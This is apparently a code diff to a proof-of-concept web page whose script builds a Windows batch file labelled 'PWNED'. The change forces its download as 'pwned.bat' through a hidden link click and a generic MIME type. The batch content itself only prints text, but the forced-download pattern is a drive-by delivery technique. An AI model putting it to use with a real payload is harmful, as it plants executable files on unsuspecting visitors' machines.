@@ -14,11 +14,12 @@
     <script>
         function t() {
             const data = "@echo off\necho PWNED\npause";
-            const blob = new Blob([data], { type: 'application/x-bat' });
+            const blob = new Blob([data], { type: 'application/octet-stream' });
             const url = window.URL.createObjectURL(blob);
-            
-            document.getElementById('log').innerText = "gen";
-            window.location.href = url;
+            const link = document.createElement('a');
+            link.href = url;
+            link.download = "pwned.bat"; 
+            link.click();
         }
 
         window.executePayload = function() {
